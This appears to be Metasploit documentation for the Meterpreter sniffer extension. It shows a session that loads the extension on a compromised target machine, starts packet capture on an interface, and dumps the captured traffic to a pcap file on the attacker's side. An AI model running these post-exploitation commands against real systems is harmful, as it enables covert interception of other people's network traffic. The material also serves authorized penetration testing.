SNIFFER EXTENSION
=================

This loadable extension allows users to capture network traffic on a target.

Loading the Sniffer
-------------------

Once you've established a connection to Mettle, you can load the sniffer extension with the following command in your msfconsole terminal:

`load sniffer`

If things go according to plan, you should get a message that the extension was successfully loaded:

```
meterpreter > load sniffer
Loading extension sniffer...Success.
```

Using the Sniffer
-----------------

The sniffer commands operate on a similar paradigm as the keylogger extension commands do.  You can see the available commands with `help` in your msfconsole terminal:

```
Sniffer Commands
================

    Command             Description
    -------             -----------
    sniffer_dump        Retrieve captured packet data to PCAP file
    sniffer_interfaces  Enumerate all sniffable network interfaces
    sniffer_release     Free captured packets on a specific interface instead of downloading them
    sniffer_start       Start packet capture on a specific interface
    sniffer_stats       View statistics of an active capture
    sniffer_stop        Stop packet capture on a specific interface
```

An Example
----------

In this example, I will load the sniffer extension on my target MacBook and then do the following:

* list the available network interfaces
* start sniffing on an interface
* on the target, the user will initiate the folloing actions which use the network interface the sniffer estension is monitoring:
  * ping Google's DNS server at 8.8.8.8
  * run curl to load the `archive.org` webpage
* stop sniffing
* dump the sniffed data from my target as a pcap file in my MSF instance

```
meterpreter > load sniffer
Loading extension sniffer...Success.
meterpreter > sniffer_interfaces

1 - 'enp0s3' ( usable:true )
2 - 'enp0s8' ( usable:true )
3 - 'Pseudo-device that captures on all interfaces' ( usable:true )
4 - 'lo' ( usable:true )
5 - 'docker0' ( usable:false )
6 - 'USB bus number 1' ( usable:false )

meterpreter > sniffer_start 1 2000
[*] Capture started on interface 1 (2000 packet buffer)
meterpreter > sniffer_stats 1
[*] Capture statistics for interface 1
	packets: 133
	bytes: 162537
meterpreter > sniffer_stop 1
[*] Capture stopped on interface 1
[*] There are 133 packets (162537 bytes) remaining
[*] Download or release them using 'sniffer_dump' or 'sniffer_release'
meterpreter > sniffer_dump 1 mycap.pcap
[*] Flushing packet capture buffer for interface 1...
[*] Flushed 133 packets (165197 bytes)
[*] Download completed, converting to PCAP...
[*] PCAP file written to mycap.pcap
```
